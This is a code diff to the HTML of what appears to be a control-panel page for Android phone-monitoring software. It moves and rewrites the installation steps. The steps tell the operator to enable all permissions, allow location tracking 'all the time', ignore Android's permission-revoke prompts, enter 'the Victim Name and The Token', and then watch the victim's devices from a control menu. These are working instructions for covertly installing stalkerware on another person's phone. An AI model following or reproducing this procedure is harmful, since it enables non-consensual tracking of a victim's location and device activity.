@@ -115,8 +115,14 @@
           <ul>
             <li>Tap the notification that pops Up with "Tap Me"</li>  
             <li>Enable yes on Ignore battery optimization</li>
-              <li>Enter the Victim Name and The Token</li>
-              <li>Make Sure to cross check the token to be 100% right</li>
+            <li>Enable All settings</li>
+            <li>
+              Note
+              <ul>
+                <li>For Location on Android 10+, allow all the time</li>
+                <li>For android 11+, ensure to ignore permission revoke as suggested by the pop notification</li>
+              </ul>
+            </li>
           </ul>
              
         </div>
@@ -137,8 +143,9 @@
         <!-- /.card-header -->
         <div class="card-body">
           <ul>
-            <li>Press the STEP Buttons on Screen and Allow all permission (For Location on Android 10+, allow all the time</li>
-            <li>PRESS STEP 2 button to finialize the SetUp</li>
+            <li>Enter the Victim Name and The Token</li>
+            <li>Make Sure to cross check the token to be 100% right</li>
+            <li>PRESS Save button to finialize the SetUp</li>
             <li>SIT BACK AND WATCH THE MAGIC HAPPEN</li>
             <li>CHECK YOUR DEVICES BY SELECTING THE DEVICES IN MENU IN THE CONTROL MENU</li>
           </ul>
